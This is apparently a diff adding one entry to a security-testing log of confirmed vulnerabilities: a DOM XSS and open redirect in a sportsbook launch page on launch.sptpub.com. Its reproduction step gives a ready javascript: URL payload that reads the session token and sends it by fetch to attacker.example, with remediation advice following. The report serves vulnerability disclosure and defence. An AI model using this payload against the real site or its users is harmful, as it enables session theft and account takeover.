@@ -1,3 +1,20 @@
 # Confirmed vulnerabilities only.
 # Do not add speculative issues, status codes, reflected strings, or accepted-but-inert fields.
 # Entry format: see skills/AGENT.md, Section 9.
+
+[VULN-20261029-001] DOM XSS / token theft via operator_page and deposit_url in Sportsbook launch bootstrap
+Status: Confirmed
+Type: XSS
+Asset: https://launch.sptpub.com/brand/2599624589818605571/sportsbook/launch
+Severity: High
+Authentication: unauthenticated
+Summary: The launch page reflects the operator_page and deposit_url query parameters into the inline JavaScript and assigns them to window.location.href in the onLogin, onRegister, and onRecharge callbacks. A javascript: value executes in the launch.sptpub.com origin, where the sportsbook session token is stored in sessionStorage under "token", allowing token theft and account takeover. The same flow also allows an open redirect.
+Reproduction:
+  1. Send a victim: https://launch.sptpub.com/brand/2599624589818605571/sportsbook/launch?lang=tr&theme=DARK&operator_page=javascript:fetch('https://attacker.example/?t='%2BencodeURIComponent(sessionStorage.getItem('token')));void(0)
+  2. The operator_page value is reflected into const operatorPage in the inline module.
+  3. When the victim clicks Login/Register (or Recharge for deposit_url), the renderer calls the callback, executing the javascript: URL in the launch.sptpub.com origin.
+  4. The payload reads sessionStorage token and exfiltrates it.
+Evidence: result/findings/VULN-20261029-001/
+Affected code: Inline module in /brand/2599624589818605571/sportsbook/launch: onLogin/onRegister/onRecharge -> window.location.href = operatorPage/depositUrl
+Remediation: Allowlist navigation targets to https URLs on configured operator domains; reject javascript:, data:, and other schemes server-side and before navigation.
+Tested at: 2026-10-29T14:36:00Z
